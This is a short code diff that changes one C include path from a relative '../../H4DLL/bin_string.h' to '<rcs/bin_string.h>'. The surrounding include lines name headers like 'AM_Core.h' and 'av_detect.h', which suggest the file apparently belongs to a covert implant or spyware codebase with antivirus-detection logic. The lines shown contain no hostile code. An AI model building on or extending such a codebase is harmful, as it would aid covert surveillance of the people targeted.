@@ -9,7 +9,7 @@
 #include "../../H4DLL/bss.h"
 #include "../../H4DLL/AM_Core.h"
 #include "../../H4DLL/LOG.h"
-#include "../../H4DLL/bin_string.h"
+#include <rcs/bin_string.h>
 #include "../../H4DLL/av_detect.h"
 
 // modules declarations
